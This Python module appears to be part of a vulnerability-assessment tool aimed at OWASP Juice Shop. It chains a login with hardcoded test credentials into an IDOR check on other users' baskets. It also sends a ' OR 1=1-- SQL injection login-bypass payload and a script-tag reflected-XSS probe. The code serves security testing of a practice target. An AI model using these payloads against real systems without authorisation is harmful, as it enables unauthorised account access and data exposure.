"""
Module 4: Vulnerability Assessment

run_auth_check() = REAL (logs in via Juice Shop's actual API)
run_idor_check() = REAL (uses the real token to test other basket IDs)
run_sqli_check() = REAL (tests login endpoint for SQLi auth bypass)
run_xss_check() = REAL (tests search endpoint for reflected XSS)
"""

import requests

TARGET_EMAIL = "test3@test.com"
TARGET_PASSWORD = "12345678"


def run_auth_check(state) -> dict:
    print(f"[vuln] Testing authentication on {state['target_url']} ...")

    login_url = state["target_url"] + "/rest/user/login"
    payload = {"email": TARGET_EMAIL, "password": TARGET_PASSWORD}

    response = requests.post(login_url, json=payload)

    if response.status_code == 200:
        data = response.json()
        token = data["authentication"]["token"]
        user_id = data["authentication"].get("umail", TARGET_EMAIL)

        return {
            "finding_type": "auth",
            "data": {
                "session_token": token,
                "role": "user",
                "logged_in_as": user_id,
            },
            "chain_trigger": True,
            "chain_data": {
                "next_module": "idor_check",
                "reason": "Valid session obtained — worth testing if it can access other users' data",
                "token": token,
            },
        }
    else:
        return {
            "finding_type": "auth",
            "data": {"login_successful": False, "status_code": response.status_code},
            "chain_trigger": False,
            "chain_data": None,
        }


def run_idor_check(state) -> dict:
    token = state["pending_chain"]["token"] if state.get("pending_chain") else None
    print(f"[vuln] Chained IDOR check using token ...")

    if not token:
        return {
            "finding_type": "idor",
            "data": {"vulnerable": False, "reason": "no token available to test with"},
            "chain_trigger": False,
            "chain_data": None,
        }

    headers = {"Authorization": f"Bearer {token}"}
    vulnerable_ids = []
    checked_ids = []

    for basket_id in range(1, 8):
        url = f"{state['target_url']}/rest/basket/{basket_id}"
        r = requests.get(url, headers=headers)
        checked_ids.append({"id": basket_id, "status": r.status_code})

        if r.status_code == 200:
            vulnerable_ids.append(basket_id)

    return {
        "finding_type": "idor",
        "data": {
            "vulnerable": len(vulnerable_ids) > 1,
            "accessible_basket_ids": vulnerable_ids,
            "detail": f"Checked basket IDs 1-7 with our token. Accessible: {vulnerable_ids}",
        },
        "chain_trigger": False,
        "chain_data": None,
    }


def run_sqli_check(state) -> dict:
    print(f"[vuln] Testing SQL injection on {state['target_url']} ...")

    login_url = state["target_url"] + "/rest/user/login"

    # Classic SQLi auth bypass payload — tries to log in as admin without
    # knowing the real password, by breaking out of the SQL query logic
    payload = {
        "email": "' OR 1=1--",
        "password": "irrelevant",
    }

    try:
        response = requests.post(login_url, json=payload)

        if response.status_code == 200:
            data = response.json()
            token = data.get("authentication", {}).get("token")
            return {
                "finding_type": "sqli",
                "data": {
                    "vulnerable": True,
                    "detail": "Authentication bypass succeeded using SQLi payload on login endpoint — logged in without valid credentials",
                    "bypass_token_obtained": bool(token),
                },
                "chain_trigger": False,
                "chain_data": None,
            }
        else:
            return {
                "finding_type": "sqli",
                "data": {
                    "vulnerable": False,
                    "detail": f"Login endpoint rejected SQLi payload (status {response.status_code})",
                },
                "chain_trigger": False,
                "chain_data": None,
            }
    except Exception as e:
        return {
            "finding_type": "sqli",
            "data": {"vulnerable": False, "error": str(e)},
            "chain_trigger": False,
            "chain_data": None,
        }


def run_xss_check(state) -> dict:
    print(f"[vuln] Testing XSS on {state['target_url']} ...")

    search_url = f"{state['target_url']}/rest/products/search"
    test_payload = "<script>alert('xss')</script>"

    try:
        r = requests.get(search_url, params={"q": test_payload})
        reflected_unescaped = test_payload in r.text

        return {
            "finding_type": "xss",
            "data": {
                "vulnerable": reflected_unescaped,
                "tested_endpoint": search_url,
                "detail": (
                    "Payload reflected WITHOUT escaping — likely XSS"
                    if reflected_unescaped
                    else "Payload was escaped/sanitized or not reflected"
                ),
            },
            "chain_trigger": False,
            "chain_data": None,
        }
    except Exception as e:
        return {
            "finding_type": "xss",
            "data": {"vulnerable": False, "error": str(e)},
            "chain_trigger": False,
            "chain_data": None,
        }